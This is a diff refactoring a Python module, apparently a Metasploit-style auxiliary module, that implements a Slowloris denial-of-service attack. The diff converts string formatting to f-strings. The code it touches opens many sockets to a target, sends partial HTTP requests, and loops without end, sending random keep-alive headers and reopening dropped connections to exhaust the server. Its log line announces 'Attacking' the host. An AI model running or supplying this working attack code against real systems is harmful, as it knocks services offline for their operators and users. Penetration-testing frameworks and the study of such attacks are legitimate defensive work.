@@ -81,14 +81,14 @@ def init_socket(host, port, use_ssl=False, rand_user_agent=True):
     if use_ssl:
         s = ssl.wrap_socket(s)
 
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
 
     if rand_user_agent:
-        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
+        s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
     else:
-        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
+        s.send(f"User-Agent: {user_agents[0]}\r\n".encode("utf-8"))
 
-    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+    s.send(f"Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
     return s
 
 
@@ -100,23 +100,31 @@ def run(args):
     socket_count = int(args['sockets'])
     delay = int(args['delay'])
 
-    module.log("Attacking %s with %s sockets" % (host, socket_count), 'info')
+    module.log(f"Attacking {host} with {socket_count} sockets", 'info')
 
     module.log("Creating sockets...", 'info')
     for i in range(socket_count):
         try:
-            module.log("Creating socket number %s" % i, 'debug')
+            module.log(f"Creating socket number {i}", 'debug')
             s = init_socket(host, port, use_ssl=use_ssl, rand_user_agent=rand_user_agent)
         except socket.error:
             break
         list_of_sockets.append(s)
 
     while True:
-        module.log("Sending keep-alive headers... Socket count: %s" % len(list_of_sockets), 'info')
+        module.log(
+            f"Sending keep-alive headers... Socket count: {len(list_of_sockets)}",
+            'info',
+        )
+
         for s in list(list_of_sockets):
             try:
-                s.send("{}: {}\r\n".format(create_random_header_name(random.randint(8, 16)),
-                                           random.randint(1, 5000)).encode("utf-8"))
+                s.send(
+                    f"{create_random_header_name(random.randint(8, 16))}: {random.randint(1, 5000)}\r\n".encode(
+                        "utf-8"
+                    )
+                )
+
 
             except socket.error:
                 list_of_sockets.remove(s)
@@ -124,8 +132,12 @@ def run(args):
         for _ in range(socket_count - len(list_of_sockets)):
             module.log("Recreating socket...", 'debug')
             try:
-                s = init_socket(host, port, use_ssl=use_ssl, rand_user_agent=rand_user_agent)
-                if s:
+                if s := init_socket(
+                    host,
+                    port,
+                    use_ssl=use_ssl,
+                    rand_user_agent=rand_user_agent,
+                ):
                     list_of_sockets.append(s)
             except socket.error:
                 break
